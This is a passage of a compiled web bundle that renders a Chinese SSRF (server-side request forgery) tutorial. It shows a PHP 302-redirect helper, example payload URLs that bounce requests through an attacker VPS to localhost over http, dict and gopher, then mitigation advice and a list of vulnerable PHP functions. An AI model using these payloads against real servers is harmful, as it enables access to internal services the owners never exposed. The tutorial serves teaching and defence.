punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"Location: '),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$schema")])]),t._v("://"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ip")])]),t._v("/"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$query")])]),t._v('"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("header")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"Location: '),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$schema")])]),t._v("://"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ip")])]),t._v(":"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$port")])]),t._v("/"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$query")])]),t._v('"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br"),a("span",{staticClass:"line-number"},[t._v("14")]),a("br")])]),a("h4",{attrs:{id:"协议跳转利用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#协议跳转利用"}},[t._v("#")]),t._v(" 协议跳转利用")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("# http/https\nhttp://xxxxx.com/ssrf.php?url=http://vps的IP/302.php?schema=http&ip=127.0.0.1&port=80\n# dict\nhttp://xxxxx.com/ssrf.php?url=http://vps的IP/302.php?schema=dict&ip=127.0.0.1&port=29362&query=info\n# gopher\nhttp://xxxxx.com/ssrf.php?url=http://vps的IP/302.php?schema=gopher&ip=127.0.0.1&port=2333&query=66666\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br")])]),a("h2",{attrs:{id:"漏洞修复建议与总结"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞修复建议与总结"}},[t._v("#")]),t._v(" 漏洞修复建议与总结")]),t._v(" "),a("ul",[a("li",[t._v("限制请求端口只能为80端口或者业务端口，限制放问只能通过 "),a("code",[t._v("http/https")]),t._v(" 协议的请求")]),t._v(" "),a("li",[t._v("禁止请求内网IP或资源")]),t._v(" "),a("li",[t._v("屏蔽所有返回的信息")])]),t._v(" "),a("h3",{attrs:{id:"常见出现ssrf漏洞函数"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#常见出现ssrf漏洞函数"}},[t._v("#")]),t._v(" 常见出现SSRF漏洞函数")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[t._v("file_get_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("fsockopen")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_exec")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("p",[t._v("当然还可以通过其他骚操作利用SSRF，参考链接：https://mohen.blog.csdn.net/article/details/108941738")]),t._v(" "),a("h2",{attrs:{id:"参考文章"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#参考文章"}},[t._v("#")]),t._v(" 参考文章")]),t._v(" "),a("p",[t._v("https://wiki.wgpsec.org/knowledge/web/csrf-ssrf.html")]),t._v(" "),a("p",[t._v("https://blog.csdn.net/qq_44632668/article/details/102631585")]),t._v(" "),a("p",[t._v("https://blog.csdn.net/qq_44632668/article/details/102631585")])])}),[],!1,null,null,null);s.default=e.exports}}]);